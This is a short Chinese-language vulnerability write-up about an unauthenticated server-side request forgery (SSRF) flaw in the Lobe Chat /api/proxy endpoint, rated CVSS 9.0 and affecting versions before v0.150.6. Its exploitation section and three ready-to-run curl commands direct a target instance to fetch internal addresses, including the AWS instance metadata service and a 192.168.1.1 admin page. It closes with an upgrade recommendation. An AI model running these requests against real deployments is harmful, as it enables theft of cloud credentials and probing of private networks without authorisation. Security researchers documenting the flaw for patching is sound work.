验证漏洞存在方法
    - 尝试访问目标Lobe Chat实例的/api/proxy端点
    - 构造包含内网地址的请求，如http://127.0.0.1:8080或http://169.254.169.254/latest/meta-data/
    - 观察响应是否返回内网服务信息或元数据

漏洞利用方法
    - 该漏洞存在于Lobe Chat的/api/proxy端点，允许未授权用户执行服务器端请求伪造(SSRF)
    - 攻击者可以构造恶意请求访问内网服务，如数据库、管理接口、云服务元数据等
    - 通过SSRF可以探测内网拓扑、窃取敏感信息或进一步攻击内网系统
    
PoC示例：
```bash
# 探测内网服务
curl -X POST "http://target-lobe-chat.com/api/proxy" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8080"}'

# 访问云服务元数据（AWS示例）
curl -X POST "http://target-lobe-chat.com/api/proxy" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# 探测其他内网服务
curl -X POST "http://target-lobe-chat.com/api/proxy" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://192.168.1.1/admin"}'
```

注意事项：
- 该漏洞影响Lobe Chat v0.150.6之前的所有版本
- 漏洞无需认证即可利用
- 修复建议：升级到v0.150.6或更高版本
- CVSS评分：9.0 (CRITICAL)
- CWE分类：CWE-918 (服务器端请求伪造)
